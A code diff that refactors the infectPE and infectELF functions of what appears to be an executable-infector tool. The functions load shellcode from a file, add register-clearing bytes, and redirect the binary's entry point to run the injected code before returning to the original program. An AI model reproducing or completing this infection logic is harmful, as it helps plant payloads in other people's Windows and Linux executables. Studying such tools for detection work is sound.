@@ -51,37 +51,20 @@ def infectPE(filename, code):
 
 	fileSC = open(code,"rb")
 	shellcode = fileSC.read().strip()
-	codeBytes = bytearray()
-	for i in shellcode:
-		codeBytes.append(i)
+	codeBytes = bytearray(shellcode)
 
 	if(bits == 64):
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xc0)
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xdb)
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xc9)
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xd2)
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xf6)
+		codeBytes += b'\x48\x31\xc0'
+		codeBytes += b'\x48\x31\xdb'
+		codeBytes += b'\x48\x31\xc9'
+		codeBytes += b'\x48\x31\xd2'
+		codeBytes += b'\x48\x31\xf6'
 	else:
-		codeBytes.append(0x31)
-		codeBytes.append(0xc0)
-		codeBytes.append(0x31)
-		codeBytes.append(0xdb)
-		codeBytes.append(0x31)
-		codeBytes.append(0xc9)
-		codeBytes.append(0x31)
-		codeBytes.append(0xd2)
-		codeBytes.append(0x31)
-		codeBytes.append(0xf6)
+		codeBytes += b'\x31\xc0'
+		codeBytes += b'\x31\xdb'
+		codeBytes += b'\x31\xc9'
+		codeBytes += b'\x31\xd2'
+		codeBytes += b'\x31\xf6'
 
 	codeBytes.append(struct.pack('I',trueEP+pe.OPTIONAL_HEADER.ImageBase)[0])
 	codeBytes.append(struct.pack('I',trueEP+pe.OPTIONAL_HEADER.ImageBase)[1])
@@ -165,37 +148,20 @@ def infectELF(filename, code):
 	#here we add mov ebp, true entry point ; jmp ebp
 	fileSC = open(code,"rb")
 	shellcode = fileSC.read().strip()
-	codeBytes = bytearray()
-	for i in shellcode:
-		codeBytes.append(i)
+	codeBytes = bytearray(shellcode)
 
 	if(bits == 64):
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xc0)
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xdb)
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xc9)
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xd2)
-		codeBytes.append(0x48)
-		codeBytes.append(0x31)
-		codeBytes.append(0xf6)
+		codeBytes += b'\x48\x31\xc0'
+		codeBytes += b'\x48\x31\xdb'
+		codeBytes += b'\x48\x31\xc9'
+		codeBytes += b'\x48\x31\xd2'
+		codeBytes += b'\x48\x31\xf6'
 	else:
-		codeBytes.append(0x31)
-		codeBytes.append(0xc0)
-		codeBytes.append(0x31)
-		codeBytes.append(0xdb)
-		codeBytes.append(0x31)
-		codeBytes.append(0xc9)
-		codeBytes.append(0x31)
-		codeBytes.append(0xd2)
-		codeBytes.append(0x31)
-		codeBytes.append(0xf6)
+		codeBytes += b'\x31\xc0'
+		codeBytes += b'\x31\xdb'
+		codeBytes += b'\x31\xc9'
+		codeBytes += b'\x31\xd2'
+		codeBytes += b'\x31\xf6'
 
 	codeBytes.append(0xbd)
 	codeBytes.append(struct.pack('I',trueEP)[0])
